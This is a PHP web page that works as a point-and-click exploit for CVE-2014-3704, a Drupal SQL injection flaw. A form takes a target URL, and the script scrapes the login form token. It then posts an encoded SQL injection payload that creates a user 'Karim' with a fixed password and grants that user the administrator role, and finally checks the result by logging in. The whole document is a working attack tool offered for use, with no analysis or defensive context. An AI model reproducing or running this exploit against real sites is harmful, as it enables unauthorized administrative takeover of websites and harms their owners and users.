<center><img src='http://im57.gulfup.com/kmhIUR.png' height="150" width="150"></img><br><br>
<font face='courier' color=red size='+1'>
CVE-2014-3704 <br>by CrashBandicot<br>Don't Change Right Noob</font><br><br>
<form method="POST"><strong></strong><input type="text" name="sub" value="http://localhost" ><input type="submit" name="send" value="Pwn!"></form><br></center>

<?php
// don't change right noob
if($_POST) {
 $tar = $_POST['sub'];
 $get = @file_get_contents("$tar/?q=user/login");
if(preg_match_all("#name=\"form_build_id\" value=\"(.*?)\" />#i",$get,$name)) {  
$tokens = $name[1];
foreach($tokens as $token){
}
$test = "name=Karim&pass=dKMNrGsieC&form_build_id=$token&form_id=user_login&op=Log%20in";
$payload = "name%5b0%20%3binsert%20into%20users%20%28uid%2c%20name%2c%20pass%2c%20mail%2c%20status%29%20select%20max%28uid%29%2b1%2c%20%27Karim%27%2c%20%27%24P\%248bxHyxnrtHg9WpndBMckxyzi.uGQfu/%27%2c%20%27test%40test.com%27%2c%201%20from%20users%3b%20insert%20into%20users_roles%20%28uid%2c%20rid%29%20VALUES%20%28%28select%20uid%20from%20users%20where%20name%3d%27Karim%27%29%2c%20%28select%20rid%20from%20role%20where%20name%20%3d%20%27administrator%27%29%29%3b%20%23%20%5d=zcxmnTgToc&name%5b0%5d=ibWmQQZOCK&pass=dVCeuMFNMV&form_build_id=$token&form_id=user_login&op=Log%20in";
$ch = curl_init ($tar."/?q=user/login");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $payload);
$data = curl_exec ($ch);
curl_close($ch);
echo "<center> Payload Sent !</center>";
echo "<br> <center>Create NeW Account Admin <br></center>";
$ch1 = curl_init ($tar."/?q=user/login");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_POST, 1);
curl_setopt ($ch1, CURLOPT_POSTFIELDS, $test);
$data1 = curl_exec ($ch1);
curl_close($ch1);
if(eregi("/user/1",$data1) || eregi("/admin/",$data1) || eregi("/user/karim",$data1) || eregi("/users/karim",$data1))
	{ 
        echo "<br> <center>SuccessFull <br>Account : Karim:dKMNrGsieC<br></center>";
} else { echo "<br><center> Exploit Fail<br></center>"; }
} else { echo "<br><center>Exploit Fail<br> </center>"; }
}
?>
